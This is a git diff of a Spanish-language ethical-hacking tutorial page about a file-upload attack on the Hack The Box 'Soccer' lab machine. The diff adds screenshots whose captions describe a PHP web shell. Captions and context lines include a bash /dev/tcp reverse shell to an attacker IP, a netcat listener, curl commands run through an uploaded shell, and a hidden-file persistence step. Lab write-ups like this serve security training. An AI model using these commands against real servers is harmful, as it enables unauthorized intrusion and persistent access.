@@ -231,6 +231,11 @@ burpsuite -> HTTP History -> Analizar POST requests</code>
                         <p>Identificamos formulario de upload que aparentemente <strong>valida extensión client-side</strong> y permite subida a directorio ejecutable <strong>/uploads/</strong>.</p>
                     </div>
 
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-5.png" alt="Formulario upload HTB Soccer" style="border-radius: 8px; border: 1px solid var(--border-color); margin: 2rem 0;">
+                        <figcaption style="text-align: center; margin-top: 1rem; color: var(--text-secondary); font-style: italic;">🎯 <strong>Formulario Upload HTB Soccer:</strong> Interfaz real de subida de archivos PHP en la máquina Soccer (10.10.11.194). Se observa el formulario web vulnerable que permite upload de archivos sin validaciones adecuadas.</figcaption>
+                    </figure>
+
                     <h4>Fase 2: Creación de Web Shells</h4>
                     <div class="code-block">
                         <div class="code-label">PHP Web Shell Básica</div>
@@ -258,6 +263,16 @@ if(isset($_GET['cmd'])) {
 ?>
 EOF</code>
                     </div>
+
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-6.png" alt="Creación archivo malicioso PHP" style="border-radius: 8px; border: 1px solid var(--border-color); margin: 2rem 0;">
+                        <figcaption style="text-align: center; margin-top: 1rem; color: var(--text-secondary); font-style: italic;">📝 <strong>Creación del Web Shell:</strong> Proceso real de creación del archivo malicioso PHP con reverse shell. Se muestra el comando utilizado para generar la web shell que establecerá conexión con la IP atacante (10.10.14.14) en puerto 443.</figcaption>
+                    </figure>
+
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-7.png" alt="Código PHP malicioso completo" style="border-radius: 8px; border: 1px solid var(--border-color); margin: 2rem 0;">
+                        <figcaption style="text-align: center; margin-top: 1rem; color: var(--text-secondary); font-style: italic;">⚙️ <strong>Payload PHP Completo:</strong> Visualización del código malicioso PHP que contiene el comando de reverse shell. El script ejecutará "bash -i >& /dev/tcp/10.10.14.14/443 0>&1" para establecer la conexión inversa.</figcaption>
+                    </figure>
 
                     <h4>Fase 3: Técnicas de Bypass Avanzadas</h4>
                     <div class="code-block">
@@ -316,6 +331,11 @@ curl "http://target.com/uploads/shell.php.jpg?cmd=uname -a"
 curl "http://target.com/uploads/shell.php.jpg?cmd=pwd"</code>
                     </div>
 
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-8.png" alt="Netcat listener máquina atacante" style="border-radius: 8px; border: 1px solid var(--border-color); margin: 2rem 0;">
+                        <figcaption style="text-align: center; margin-top: 1rem; color: var(--text-secondary); font-style: italic;">📋 <strong>Listener Netcat:</strong> Configuración del listener en la máquina atacante (10.10.14.14) en puerto 443 esperando la conexión de reverse shell. Se muestra el comando "nc -nlvp 443" listo para recibir la conexión.</figcaption>
+                    </figure>
+
                     <div class="alert alert-warning">
                         <p>Si el servidor procesa archivos <strong>.jpg</strong> como PHP (AddHandler) o permite <strong>double extension</strong>, la shell será ejecutable y tendremos RCE completo.</p>
                     </div>
@@ -339,6 +359,11 @@ curl "http://target.com/uploads/shell.php.jpg?cmd=bash -c 'bash -i >%26 /dev/tcp
 # Crear persistencia adicional
 curl "http://target.com/uploads/shell.php.jpg?cmd=cp shell.php.jpg /var/www/html/.hidden.php"</code>
                     </div>
+
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-9.png" alt="Reverse shell exitosa HTB Soccer" style="border-radius: 8px; border: 1px solid var(--border-color); margin: 2rem 0;">
+                        <figcaption style="text-align: center; margin-top: 1rem; color: var(--text-secondary); font-style: italic;">⚡ <strong>Reverse Shell Establecida:</strong> Conexión exitosa de reverse shell en HTB Soccer. Se observa el acceso completo al terminal del servidor víctima con capacidades de ejecución interactiva de comandos del sistema.</figcaption>
+                    </figure>
 
                     <div class="alert alert-info">
                         <p><strong>Resultado:</strong> RCE completo obtenido, acceso interactivo al servidor mediante reverse shell, capacidad de enumeración del sistema y establecimiento de múltiples puntos de persistencia.</p>
